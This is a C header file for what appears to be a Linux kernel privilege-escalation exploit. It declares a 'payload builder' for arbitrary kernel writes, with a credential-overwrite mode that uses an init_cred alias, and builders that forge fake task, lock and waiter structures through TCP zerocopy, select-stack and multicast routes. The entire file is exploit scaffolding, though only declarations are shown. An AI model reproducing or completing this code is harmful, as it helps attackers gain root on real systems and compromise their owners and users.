#ifndef PAYLOAD_BUILDER_H
#define PAYLOAD_BUILDER_H

#include <stddef.h>
#include <stdint.h>

typedef enum WriteMode {
  WRITE_MODE_DISABLED = 0,
  WRITE_MODE_ZERO = 1,
  WRITE_MODE_CREDENTIAL = 2,
} WriteMode;

/* Immutable description of one kernel write. `preserve_child` selects the
 * one-child erase layout; false selects the leaf/zero layout. */
typedef struct WriteRequest {
  uintptr_t target;
  WriteMode mode;
  int preserve_child;
} WriteRequest;

typedef struct PayloadWriteLayout {
  uintptr_t parent;
  uintptr_t right;
  uintptr_t left;
  uintptr_t fops;
  int needs_credential_copy;
} PayloadWriteLayout;

static inline WriteRequest write_request_make(
    uintptr_t target, WriteMode mode, int leaf) {
  const WriteRequest request = {
    .target = target,
    .mode = mode,
    .preserve_child = leaf ? 0 : 1,
  };
  return request;
}

/* Resolve the request-dependent words shared by the three route encoders. */
PayloadWriteLayout payload_write_layout(
    const WriteRequest *request, uintptr_t page_base,
    uintptr_t default_fops, uintptr_t credential_fops,
    uintptr_t init_cred_alias);

/* Encode only the request-dependent compact waiter words. The remaining
 * common fake task/lock fields are built by the shared payload builder. */
void build_tcp_zerocopy_payload(
    unsigned char *waiter, const WriteRequest *request,
    const PayloadWriteLayout *layout);
void build_select_stack_payload(
    unsigned char *waiter, const PayloadWriteLayout *layout);
void build_multicast_waiter_payload(
    unsigned char *buffer, size_t waiter_offset, size_t task_offset,
    size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock);

/* Fixed-vector comparison against the legacy scalar formulas used before S07. */
int payload_builder_equivalence_test(void);

#endif
